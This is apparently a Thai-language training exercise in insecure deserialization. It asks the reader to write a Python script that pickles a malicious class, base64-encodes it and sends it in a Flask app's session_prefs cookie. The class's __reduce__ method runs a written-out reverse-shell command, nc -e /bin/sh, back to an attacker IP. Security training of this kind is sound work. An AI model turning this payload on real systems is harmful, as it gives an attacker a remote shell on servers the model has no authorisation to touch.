# ภารกิจที่ 4: The Poisoned Cookie (Insecure Deserialization)
# สถานการณ์: เว็บไซต์แอปพลิเคชันหนึ่ง (http://target.local/profile) เขียนด้วย Python Flask คุณสังเกตเห็นว่า Cookie ที่ชื่อ session_prefs 
# มีหน้าตาเป็น Base64 ยาวๆ และเมื่อนำไปถอดรหัส มันดูเหมือนข้อมูล Byte stream แปลกๆ ที่ขึ้นต้นด้วยจุด (.) หรือมีตัว \x80\x04 (ซึ่งเป็นลายเซ็นของ Python Pickle)
# โจทย์:
# จงเขียนสคริปต์ที่ทำหน้าที่ "สร้างอาวุธ" (Weaponize) และ "ส่งไปยิง" ในตัวเดียว:
# สร้าง Class Python ที่มีฟังก์ชัน __reduce__ ภายในฟังก์ชันนี้ให้สั่งรันคำสั่ง OS ย้อนกลับมาหาคุณ (เช่น ใช้ os.system("nc -e /bin/sh 10.0.0.5 4444"))
# ใช้ pickle.dumps() บรรจุ Class นั้น
# เข้ารหัส Base64 ให้เรียบร้อย
# ใช้ requests.get() ส่ง HTTP Request ไปที่ /profile โดยยัด Payload ที่เข้ารหัสแล้วนี้เข้าไปใน Cookie session_prefs
# คำเตือน: ทดสอบรันแค่โค้ดฝั่งสร้าง Payload ก่อน เพื่อดูว่าได้ข้อความ Base64 ออกมาถูกต้องไหม (ระวังอย่าเผลอ pickle.loads Payload ตัวเองตอนรันสคริปต์ล่ะ!)